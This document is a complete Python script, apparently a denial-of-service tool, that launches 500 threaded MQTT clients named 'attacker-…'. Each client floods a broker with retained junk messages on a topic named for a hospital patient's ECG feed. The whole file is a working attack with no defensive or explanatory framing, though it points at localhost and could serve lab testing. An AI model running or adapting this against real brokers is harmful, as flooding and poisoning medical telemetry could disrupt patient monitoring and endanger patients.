# mqtt_dos.py
import paho.mqtt.client as mqtt
import threading
import random
import string
import time

BROKER = "127.0.0.1"
PORT = 1883
TOPIC = "/patients/ward1/bed1/ecg"
CLIENTS = 500
QOS = 1
RETAIN = True

def random_id(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def mqtt_flood():
    client_id = "attacker-" + random_id()
    client = mqtt.Client(client_id=client_id, clean_session=False)
    try:
        client.connect(BROKER, PORT, 60)
        client.loop_start()
        client.publish(TOPIC, payload="MSG_" + random_id(5), qos=QOS, retain=RETAIN)
        time.sleep(1)
        client.loop_stop()
        client.disconnect()
    except Exception as e:
        print(f"[!] Failed: {e}")

threads = []
print(f"[*] Launching {CLIENTS} clients...")
for _ in range(CLIENTS):
    t = threading.Thread(target=mqtt_flood)
    t.start()
    threads.append(t)
    time.sleep(0.01)

for t in threads:
    t.join()

print("[+] Attack completed.")

